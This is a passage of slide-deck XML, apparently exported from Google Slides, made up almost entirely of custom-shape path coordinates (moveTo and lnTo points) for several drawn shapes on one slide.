                    <a:pt x="2899" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="11739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="13573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="13683"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="13720"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="13756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="13793"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="13830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="13830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="13756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2569" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="955" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="478" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1065" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1652" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4183" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="478"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10455" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10162" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9832" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9245" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="2899"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="918" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="258" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="221" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="955" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1285" y="8658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="14233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="14380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3596" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="13793"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="13610"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="13353"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11739" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13133" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13903" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14160" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14197" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14270" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14563" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14637" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14674" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14637" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14270" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13867" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12949" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12473" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11409" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10749" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455"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3" name="Google Shape;313;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6316250" y="3040425"/>
              <a:ext cx="137600" cy="122000"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="5504" h="4880" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="5173" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5063" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4770" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2239" y="807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="918" y="661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="625" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="478" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="258" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="258" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="698" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="955" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="698" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="735" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1175" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1542" y="1504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3376" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3376" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3376" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3853" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5467" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283"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4" name="Google Shape;314;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6879325" y="4294925"/>
              <a:ext cx="344825" cy="254975"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="13793" h="10199" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="5649" y="2128"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5503" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="2312"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="2899"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5906" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6456" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="3009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7263" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8070" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="3009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6566" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="2128"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12215" y="3485"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12142" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12436" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12546" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12546" y="5320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11885" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11885" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11849" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="5320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11152" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10601" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11519" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11849" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13353" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13793" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13793" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13756" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13353" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13059" y="5320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13059" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
